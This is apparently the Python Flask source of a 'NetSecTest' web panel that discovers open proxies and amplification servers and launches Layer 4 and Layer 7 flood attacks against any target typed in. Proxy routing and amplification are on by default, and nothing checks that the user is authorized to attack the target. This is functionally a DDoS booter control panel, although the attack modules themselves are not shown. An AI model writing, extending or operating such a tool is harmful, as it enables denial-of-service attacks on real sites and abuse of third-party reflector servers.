#!/usr/bin/env python3

import os
import time
from flask import Flask, render_template, request, jsonify, redirect, url_for
import logging
import json
from modules.storage import Storage
from modules.proxy_scanner import ProxyScanner
from modules.amplification_scanner import AmplificationScanner
from modules.attack_methods import Layer4, Layer7

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger("NetSecTest-Web")

# Create Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key")

# Initialize storage and components
storage = Storage()
proxy_scanner = ProxyScanner(storage)
amp_scanner = AmplificationScanner(storage)
layer4 = Layer4(storage)
layer7 = Layer7(storage)

# Custom filter for timestamp formatting
@app.template_filter('timestamp_format')
def timestamp_format(timestamp):
    """Format a Unix timestamp to a human-readable string."""
    if not timestamp:
        return 'Never'
    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))

@app.route('/')
def index():
    """Render the main dashboard."""
    stats = {
        "proxies_total": storage.get_proxy_count(),
        "proxies_working": len(storage.get_working_proxies()),
        "amp_servers_total": storage.get_amplification_server_count(),
        "amp_servers_working": len(storage.get_working_amplification_servers()),
        "proxy_scanning": proxy_scanner.scanning,
        "amp_scanning": amp_scanner.scanning,
        "attacks_running": layer4.get_running_attacks_count() + layer7.get_running_attacks_count()
    }
    
    return render_template('index.html', stats=stats)

@app.route('/proxies')
def proxies():
    """Display all discovered proxies."""
    proxies = storage.get_all_proxies()
    return render_template('proxies.html', proxies=proxies)

@app.route('/amplification')
def amplification():
    """Display all discovered amplification servers."""
    servers = storage.get_all_amplification_servers()
    return render_template('amplification.html', servers=servers)

@app.route('/api/proxies')
def api_proxies():
    """API endpoint to retrieve proxies."""
    proxies = storage.get_all_proxies()
    return jsonify(proxies)

@app.route('/api/working-proxies')
def api_working_proxies():
    """API endpoint to retrieve working proxies."""
    proxies = storage.get_working_proxies()
    return jsonify(proxies)

@app.route('/api/amplification')
def api_amplification():
    """API endpoint to retrieve amplification servers."""
    servers = storage.get_all_amplification_servers()
    return jsonify(servers)

@app.route('/api/working-amplification')
def api_working_amplification():
    """API endpoint to retrieve working amplification servers."""
    servers = storage.get_working_amplification_servers()
    return jsonify(servers)

@app.route('/api/toggle-proxy-scanning', methods=['POST'])
def toggle_proxy_scanning():
    """Toggle proxy scanning."""
    if proxy_scanner.scanning:
        proxy_scanner.stop_scanning()
        status = "stopped"
    else:
        proxy_scanner.start_scanning()
        status = "started"
    
    return jsonify({"status": f"Proxy scanning {status}", "scanning": proxy_scanner.scanning})

@app.route('/api/toggle-amp-scanning', methods=['POST'])
def toggle_amp_scanning():
    """Toggle amplification server scanning."""
    if amp_scanner.scanning:
        amp_scanner.stop_scanning()
        status = "stopped"
    else:
        amp_scanner.start_scanning()
        status = "started"
    
    return jsonify({"status": f"Amplification scanning {status}", "scanning": amp_scanner.scanning})

@app.route('/api/test-proxies', methods=['POST'])
def test_proxies():
    """Test all stored proxies."""
    proxy_scanner.test_all_proxies()
    return jsonify({"status": "Proxy testing initiated"})

@app.route('/api/test-amplification', methods=['POST'])
def test_amplification():
    """Test all stored amplification servers."""
    amp_scanner.test_all_servers()
    return jsonify({"status": "Amplification server testing initiated"})

@app.route('/api/clear-proxies', methods=['POST'])
def clear_proxies():
    """Clear all stored proxies."""
    storage.clear_proxies()
    return jsonify({"status": "All proxies cleared"})

@app.route('/api/clear-amplification', methods=['POST'])
def clear_amplification():
    """Clear all stored amplification servers."""
    storage.clear_amplification_servers()
    return jsonify({"status": "All amplification servers cleared"})

@app.route('/api/stats')
def api_stats():
    """API endpoint to retrieve current stats."""
    stats = {
        "proxies_total": storage.get_proxy_count(),
        "proxies_working": len(storage.get_working_proxies()),
        "amp_servers_total": storage.get_amplification_server_count(),
        "amp_servers_working": len(storage.get_working_amplification_servers()),
        "proxy_scanning": proxy_scanner.scanning,
        "amp_scanning": amp_scanner.scanning,
        "attacks_running": layer4.get_running_attacks_count() + layer7.get_running_attacks_count(),
        "active_proxy_threads": proxy_scanner.get_thread_count(),
        "active_amp_threads": amp_scanner.get_thread_count()
    }
    
    return jsonify(stats)

@app.route('/attacks')
def attacks():
    """Display attack methods page."""
    return render_template('attacks.html')

@app.route('/api/launch-attack', methods=['POST'])
def launch_attack():
    """Launch an attack with the specified method and parameters."""
    data = request.json
    
    if not data:
        return jsonify({"success": False, "error": "No data provided"})
    
    # Extract parameters
    method = data.get('method')
    target = data.get('target')
    duration = int(data.get('duration', 60))
    threads = int(data.get('threads', 10))
    layer = int(data.get('layer', 7))
    
    # Validate required parameters
    if not method or not target:
        return jsonify({"success": False, "error": "Missing required parameters"})
    
    # Limit duration for safety
    duration = min(duration, 300)  # Maximum 5 minutes
    threads = min(threads, 100)    # Maximum 100 threads
    
    try:
        # Launch the appropriate attack
        if layer == 7:
            use_proxies = data.get('use_proxies', True)
            attack_id = layer7.start_attack(
                target=target,
                method=method,
                duration=duration,
                threads=threads,
                use_proxies=use_proxies
            )
            logger.info(f"Started Layer 7 {method} attack (ID: {attack_id}) against {target}")
        else:  # Layer 4
            use_amplification = data.get('use_amplification', True)
            attack_id = layer4.start_attack(
                target=target,
                method=method,
                duration=duration,
                threads=threads,
                use_amplification=use_amplification
            )
            logger.info(f"Started Layer 4 {method} attack (ID: {attack_id}) against {target}")
        
        return jsonify({
            "success": True,
            "attack_id": attack_id,
            "message": f"Attack started successfully with ID: {attack_id}"
        })
    
    except Exception as e:
        logger.error(f"Error launching attack: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/stop-attack', methods=['POST'])
def stop_attack():
    """Stop a specific attack by ID."""
    data = request.json
    
    if not data:
        return jsonify({"success": False, "error": "No data provided"})
    
    attack_id = data.get('attack_id')
    
    if not attack_id:
        return jsonify({"success": False, "error": "Missing attack ID"})
    
    try:
        # Try to stop in both layers (only one will succeed)
        layer4_stopped = layer4._stop_attack(attack_id)
        layer7_stopped = layer7._stop_attack(attack_id)
        
        if layer4_stopped or layer7_stopped:
            logger.info(f"Stopped attack {attack_id}")
            return jsonify({"success": True, "message": f"Attack {attack_id} stopped"})
        else:
            return jsonify({"success": False, "error": f"Attack {attack_id} not found"})
    
    except Exception as e:
        logger.error(f"Error stopping attack: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/stop-all-attacks', methods=['POST'])
def stop_all_attacks():
    """Stop all running attacks."""
    try:
        layer4.stop_all_attacks()
        layer7.stop_all_attacks()
        logger.info("All attacks stopped")
        return jsonify({"success": True, "message": "All attacks stopped"})
    
    except Exception as e:
        logger.error(f"Error stopping all attacks: {e}")
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/running-attacks')
def running_attacks():
    """Get all currently running attacks."""
    try:
        # Combine attacks from both layers
        attacks = []
        
        # Layer 4 attacks
        if hasattr(layer4, 'running_attacks') and layer4.running_attacks:
            for attack_id, attack in layer4.running_attacks.items():
                attacks.append({
                    "id": attack_id,
                    "layer": 4,
                    "method": attack["method"],
                    "target": attack["target"],
                    "start_time": attack["start_time"],
                    "duration": attack["duration"],
                    "threads": attack["threads"]
                })
        
        # Layer 7 attacks
        if hasattr(layer7, 'running_attacks') and layer7.running_attacks:
            for attack_id, attack in layer7.running_attacks.items():
                attacks.append({
                    "id": attack_id,
                    "layer": 7,
                    "method": attack["method"],
                    "target": attack["target"],
                    "start_time": attack["start_time"],
                    "duration": attack["duration"],
                    "threads": attack["threads"]
                })
        
        return jsonify({"success": True, "attacks": attacks})
    
    except Exception as e:
        logger.error(f"Error retrieving running attacks: {e}")
        return jsonify({"success": False, "error": str(e), "attacks": []})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)